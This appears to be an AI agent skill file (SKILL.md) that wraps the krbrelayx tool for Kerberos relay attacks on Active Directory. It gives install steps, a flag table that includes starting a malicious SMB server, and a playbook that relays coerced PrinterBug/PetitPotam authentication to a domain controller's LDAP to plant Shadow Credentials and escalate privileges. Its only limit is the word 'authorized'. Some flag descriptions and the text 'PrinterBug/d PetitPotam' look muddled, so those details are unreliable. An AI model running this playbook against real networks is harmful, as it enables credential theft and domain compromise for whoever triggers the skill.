---
name: krbrelayx-kerberos-relay
description: "krbrelayx executes Kerberos relay and ticket attack scenarios. Signals: Kerberos, ticket attack, Kerberos relay, target SPN, malicious SMB."
zh-signals: "krbrelayx: Kerberos与票据攻击场景。信号:kerberos,票据攻击,Kerberos 中继,目标 SPN,起恶意 SMB。"
when-to-use: >-
  Use when running authorized Kerberos relay or ticket attacks in an Active Directory
  environment, including relaying coerced authentication to LDAP for Shadow Credentials.
---

# krbrelayx

- Attack Category: C26 Kerberos and Ticket Attacks
- Upstream Repository: https://github.com/dirkjanm/krbrelayx
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/dirkjanm/krbrelayx && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python krbrelayx.py -t ldap://dc01` | Kerberos relay |
| `--target user@corp.local` | Target SPN |
| `-s 2` | Shadow Credentials attack |
| `--serve` | Start a malicious SMB server |

## Attack Scenario Playbook

### PrinterBug + Shadow Credentials privilege escalation

```bash
python krbrelayx.py -t ldap://dc01 --target svc$ -s 2
# Pair with PrinterBug/d PetitPotam to coerce authentication → relay to LDAP to set Shadow Credentials
```

## Notes

By dirkjanm; brings the NTLM relay approach to Kerberos, a standard part of Shadow Credentials attacks.
